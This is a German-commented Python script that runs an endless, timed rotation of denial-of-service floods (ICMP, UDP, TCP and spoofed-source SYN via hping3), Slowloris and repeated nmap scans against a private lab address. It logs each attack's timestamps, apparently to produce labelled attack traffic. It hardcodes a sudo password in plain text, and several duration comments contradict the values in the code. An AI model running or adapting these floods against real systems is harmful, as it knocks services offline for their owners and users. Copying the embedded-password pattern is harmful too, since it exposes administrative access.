import subprocess
import time
from datetime import datetime

commands = [
    ("ICMP Flood", ["sudo", "hping3", "--flood", "-1", "192.168.1.25"]),
    ("Portscan", ["bash", "-c", "for i in {1..10000}; do sudo nmap -sT 192.168.1.25; sleep 1; done"]),
    ("OS Fingerprinting", ["bash", "-c", "for i in {1..10000}; do sudo nmap -O 192.168.1.25; sleep 1; done"]),
    ("Aggressive Scan", ["bash", "-c", "for i in {1..10000}; do sudo nmap -A 192.168.1.25; sleep 1; done"]),
    ("Slowloris", ["python3", "slowloris.py", "192.168.1.25", "-s", "500"]),
    ("UDP Flood", ["sudo", "hping3", "--flood", "--udp", "-p", "80", "192.168.1.25"]),
    ("TCP Flood", ["sudo", "hping3", "--flood", "-p", "80", "192.168.1.25"]),
    ("Synonymous Flood", ["sudo", "hping3", "--flood", "--rand-source", "-p", "80", "192.168.1.25"]),
]

LOG_FILE = "timestamp_attacks_28_07.txt"
RUN_TIME = 3 * 60      # 15 Minuten
BREAK_TIME = 2 * 60    # 20 Minuten

def log_msg(msg):
    with open(LOG_FILE, "a") as f:
        f.write(msg + "\n")

#TODO Passwort löschen danach!!!
password = "1234"

while True:
    for name, cmd in commands:
        start_time = datetime.now()
        log_msg(f"Start: {start_time.strftime('%Y-%m-%d %H:%M:%S')} - Angriff: {name} - Befehl: {' '.join(cmd)}")
        print(f"Start: {start_time.strftime('%Y-%m-%d %H:%M:%S')} - Angriff: {name} - Befehl: {' '.join(cmd)}")

        try:
            if cmd[0] == "sudo":
                full_cmd = ["sudo", "-S"] + cmd[1:]
                proc = subprocess.Popen(
                    full_cmd,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                try:
                    proc.communicate(password + "\n", timeout=RUN_TIME)
                    note = "Erfolgreich beendet"
                except subprocess.TimeoutExpired:
                    proc.terminate()
                    try:
                        proc.wait(10)
                    except Exception:
                        proc.kill()
                    note = "Nach 10 Minuten abgebrochen"
            else:
                proc = subprocess.Popen(cmd)
                try:
                    proc.wait(timeout=RUN_TIME)
                    note = "Erfolgreich beendet"
                except subprocess.TimeoutExpired:
                    proc.terminate()
                    try:
                        proc.wait(10)
                    except Exception:
                        proc.kill()
                    note = "Nach 10 Minuten abgebrochen"
        except Exception as e:
            note = f"Fehler: {e}"

        end_time = datetime.now()
        log_msg(f"Ende: {end_time.strftime('%Y-%m-%d %H:%M:%S')} ({note})")
        print(f"Ende: {end_time.strftime('%Y-%m-%d %H:%M:%S')} ({note})")

        # Hier Pause von 20 Minuten einbauen
        print(f"Pause von {BREAK_TIME // 60} Minuten beginnt jetzt...")
        log_msg(f"Pause von {BREAK_TIME // 60} Minuten beginnt jetzt...\n")
        time.sleep(BREAK_TIME)

